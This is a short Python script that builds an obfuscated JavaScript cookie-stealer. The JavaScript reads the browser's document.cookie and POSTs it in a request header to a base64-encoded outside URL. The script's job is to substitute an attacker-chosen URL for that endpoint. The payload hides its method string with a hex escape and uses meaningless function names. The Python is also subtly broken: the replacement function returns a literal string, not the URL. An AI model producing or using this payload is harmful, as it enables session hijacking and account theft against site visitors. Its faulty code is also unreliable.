import sys

def replace_base64_url(url):
  return """ + url + """

def main(argv):
  if len(argv) != 2:
    print("Usage: python replace_base64_url.py <url>")
    return

  base64_url = "aHR0cHM6Ly9jeWJlcnZ0Lm9yZy9mdW4="
  url = argv[1]

  js = """function cwert(str){return decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return'%'+('00'+c.charCodeAt(0).toString(16)).slice(-2);}).join(''));}function jklpo(){var x=document.cookie;var ajax=new XMLHttpRequest();ajax.open("P\x4fST",cwert("aHR0cHM6Ly9jeWJlcnZ0Lm9yZy9mdW4="),!0);ajax.setRequestHeader("From",encodeURIComponent(x));ajax.send();}jklpo();"""
  js = js.replace(base64_url, replace_base64_url(url))

  print(js)

if __name__ == "__main__":
  main(sys.argv)
